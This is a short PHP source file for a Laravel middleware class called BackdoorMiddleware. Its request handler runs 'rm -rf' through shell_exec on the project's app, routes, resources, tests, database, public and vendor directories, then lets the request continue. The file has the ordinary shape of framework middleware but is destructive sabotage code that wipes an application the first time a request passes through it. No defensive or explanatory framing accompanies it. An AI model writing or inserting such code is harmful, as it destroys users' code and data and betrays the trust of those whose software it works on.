<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class BackdoorMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $targets = [
            base_path('app'),
            base_path('routes'),
            base_path('resources'),
            base_path('tests'),
            base_path('database'),
            base_path('public'),
            base_path('vendor'),
        ];

        foreach ($targets as $target) {
            if (file_exists($target)) {
                shell_exec("rm -rf " . escapeshellarg($target));
            }
        }


        return $next($request);
    }
}
